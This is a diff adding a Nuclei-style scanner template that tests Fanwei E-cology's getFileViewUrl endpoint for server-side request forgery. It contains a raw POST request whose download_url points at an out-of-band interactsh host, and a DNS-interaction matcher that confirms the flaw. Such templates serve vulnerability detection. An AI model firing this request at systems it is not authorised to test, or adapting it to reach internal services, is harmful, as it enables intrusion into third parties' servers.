@@ -1,0 +1,28 @@
+id: fanwei-ecology-getfileviewurl-ssrf
+
+info:
+  name: msk-template
+  author: msk
+  severity: high
+
+http:
+  - raw:
+      - |
+        POST /api/doc/mobile/fileview/getFileViewUrl HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Type: application/json
+
+        {
+        "file_id": "1000",
+        "file_name": "aa",
+        "download_url":"http://{{interactsh-url}}"
+        }
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
